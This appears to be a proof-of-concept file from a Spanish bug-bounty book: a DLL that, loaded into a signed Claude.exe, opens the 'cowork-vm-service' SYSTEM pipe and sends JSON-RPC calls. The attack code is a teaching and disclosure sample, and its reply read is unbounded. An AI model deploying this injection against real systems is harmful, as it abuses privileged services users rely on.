// Extraído de: LibroBugBounty/cap-23-caso-anthropic.md
/**
 * pipe_inject.c -- Desde dentro de Claude.exe firmado,
 * conectar al pipe SYSTEM y ejecutar metodos RPC.
 */
#include <windows.h>
#include <stdio.h>

void send_rpc(HANDLE pipe, const char *method) {
    char msg[512];
    int len = sprintf(msg,
        "{\"method\":\"%s\",\"params\":{}}", method);
    /* Framing: 4 bytes Big-Endian + JSON */
    DWORD be_len = htonl(len);
    DWORD written;
    WriteFile(pipe, &be_len, 4, &written, NULL);
    WriteFile(pipe, msg, len, &written, NULL);
    /* Leer respuesta */
    DWORD resp_len;
    ReadFile(pipe, &resp_len, 4, &written, NULL);
    resp_len = ntohl(resp_len);
    char resp[4096] = {0};
    ReadFile(pipe, resp, resp_len, &written, NULL);
    /* Registrar resultado */
    log_to_file("[%s] %s\n", method, resp);
}

DWORD WINAPI exploit(LPVOID p) {
    HANDLE pipe = CreateFileA(
        "\\\\.\\pipe\\cowork-vm-service",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (pipe == INVALID_HANDLE_VALUE) return 1;

    send_rpc(pipe, "configure");
    send_rpc(pipe, "isRunning");

    CloseHandle(pipe);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH)
        CreateThread(NULL, 0, exploit, NULL, 0, NULL);
    return TRUE;
}
